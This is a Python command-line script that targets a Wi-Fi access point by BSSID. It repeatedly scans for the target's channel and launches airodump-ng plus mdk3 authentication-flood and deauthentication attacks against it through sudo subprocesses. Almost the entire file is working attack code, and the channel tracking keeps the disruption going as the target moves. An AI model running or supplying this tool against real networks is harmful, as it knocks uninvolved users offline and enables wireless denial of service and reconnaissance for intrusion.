import os
import re
import subprocess
import threading
from time import sleep
from typing import Any

import click
from rich.console import Console
from rich.traceback import install

from logger import logger

console: Console = Console()


install()

INTERFACE_1 = "wlan0"
INTERFACE_2 = "wlan0mon"


class Target:
    obj = None

    def __new__(cls, *args, **kwargs):
        if cls.obj is None:
            cls.obj = super().__new__(cls)

        return cls.obj

    def __init__(self, bssid: str) -> None:
        self.bssid = bssid.lower()
        self.channel = None

    def __setattr__(self, name: str, value: Any, /) -> None:
        if hasattr(self, name):
            super().__setattr__(name, value)
            print(self)

            logger.info(f"Set up the {INTERFACE_2} link.")
            subprocess.run(["sudo", "ip", "link", "set", INTERFACE_2, "up"])

            logger.info(f"Starting the <b>airodump-ng</b> sub process...")
            threading.Thread(
                target=subprocess.run,
                args=(
                    [
                        "sudo",
                        "airodump-ng",
                        "--wps",
                        "--uptime",
                        "--gpsd",
                        "--manufacturer",
                        "--ignore-negative-one",
                        "--bssid",
                        f"{self.bssid}",
                        "--channel",
                        f"{self.channel}",
                        INTERFACE_2,
                    ],
                ),
                kwargs={"stdout": open(os.devnull, "wt")},
            ).start()

            logger.info("Starting the <b>mdk3</b> sub processes...")
            threading.Thread(
                target=subprocess.run,
                args=(
                    ["sudo", "mdk3", INTERFACE_2, "a", "-a", self.bssid, "-c", "-m"],
                ),
                kwargs={"stdout": open(os.devnull, "wt")},
            ).start()

            threading.Thread(
                target=subprocess.run,
                args=(["sudo", "mdk3", INTERFACE_2, "d"],),
                kwargs={"stdout": open(os.devnull, "wt")},
            ).start()

        return super().__setattr__(name, value)

    def __repr__(self) -> str:
        return f"<Target bssid={self.bssid!r} channel={self.channel!r}>"


def refresh(interface: str):
    while True:
        logger.info("Killing previous processes...")
        os.system("sudo pkill -9 mdk3")
        os.system("sudo pkill -9 airodump-ng")

        logger.info(f"Set down the {INTERFACE_2} link.")
        subprocess.run(["sudo", "ip", "link", "set", INTERFACE_2, "down"])

        logger.info(f"Set up the {interface} link.")
        subprocess.run(["sudo", "ip", "link", "set", interface, "up"])

        logger.info(f"Scanning...")
        process = subprocess.run(
            ["sudo", "iw", "dev", interface, "scan"],
            capture_output=True,
            text=True,
            check=False,
        )

        logger.info(f"Set down the {interface} link.")
        subprocess.run(["sudo", "ip", "link", "set", interface, "down"])

        logger.info(f"Extracting the BSSID and Channel...")
        process = subprocess.run(
            ["egrep", "^BSS|channel:|set: channel"],
            capture_output=True,
            input=process.stdout,
            text=True,
            check=False,
        )

        lst = []

        for a in [
            "\n".join([y.strip() for y in x.strip().split("\n")])
            for x in process.stdout.split("BSS")
            if x
        ]:
            item = []
            if search := re.search("([A-Za-z0-9]{2}:){1,}..", a):
                start, end = search.span()
                item.append(a[start:end])

            if search := re.search("channel:?.[0-9]{1,}", a):
                start, end = search.span()
                item.append(
                    int(x) if (x := re.sub("channel:?.", "", a[start:end])) else None
                )

            lst.append(item)

        dct = dict(lst)

        if Target.obj is not None and (channel := dct.get(Target.obj.bssid)):
            logger.info(f"Update channel to {channel!r}.")
            Target.obj.channel = channel

            logger.info("Sleep 15 for seconds.")
            sleep(15)

        sleep(2.5)


@click.command()
@click.option("--bssid", type=str, required=True, help="Specify the target BSSID.")
def main(bssid: str) -> None:
    threading.Thread(target=refresh, args=(INTERFACE_1,)).start()

    Target(bssid)


if __name__ == "__main__":
    main()
